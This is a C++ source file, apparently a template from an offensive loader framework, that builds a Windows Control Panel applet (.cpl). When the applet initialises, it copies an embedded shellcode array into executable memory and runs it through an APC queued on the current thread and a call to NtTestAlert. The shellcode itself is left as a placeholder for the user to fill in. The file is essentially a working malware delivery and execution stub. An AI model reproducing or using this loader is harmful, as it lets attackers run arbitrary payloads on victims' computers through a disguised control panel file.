/**
Editor: Thomas X Meng
***/

#include <windows.h>
#include <cstdio>
#include <cpl.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

unsigned char magiccode[] = ####SHELLCODE####;


extern "C" __declspec(dllexport) LONG CALLBACK CPlApplet(HWND hwndCpl, UINT uMsg, LPARAM lParam1, LPARAM lParam2) {
    switch (uMsg) {
        case CPL_INIT: {
            MessageBox(NULL, "CPL_INIT triggered", "Debug", MB_OK);


            /// Here is for all the options Boaz have
            // MessageBoxA(NULL, "Hello from DllMain! Before other code", "DllMain", MB_OK);
            myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
            SIZE_T magicSize = sizeof(magiccode);
            LPVOID magicAddress = VirtualAlloc(NULL, magicSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            if (magicAddress == NULL) {
                printf("[-] VirtualAlloc failed.\n");
                return FALSE;
            }

            BOOL writeResult = WriteProcessMemory(GetCurrentProcess(), magicAddress, magiccode, magicSize, NULL);
            if (!writeResult) {
                printf("[-] WriteProcessMemory failed (%d).\n", GetLastError());
                return FALSE;
            }

            PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)magicAddress;
            QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)0);
            testAlert();
            return TRUE;
        }
        case CPL_GETCOUNT:
            return 1;
        case CPL_NEWINQUIRE: {
            LPCPLINFO lpCplInfo = (LPCPLINFO)lParam2;
            lpCplInfo->idIcon = 0;
            lpCplInfo->idName = 1;
            lpCplInfo->idInfo = 2;
            lpCplInfo->lData = 0;
            return 0;
        }
        case CPL_DBLCLK: {
            MessageBox(NULL, "CPL_DBLCLK triggered", "Debug", MB_OK);
            return 0;

        }
        case CPL_STOP:
        case CPL_EXIT:
        default:
            return 0;
    }
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
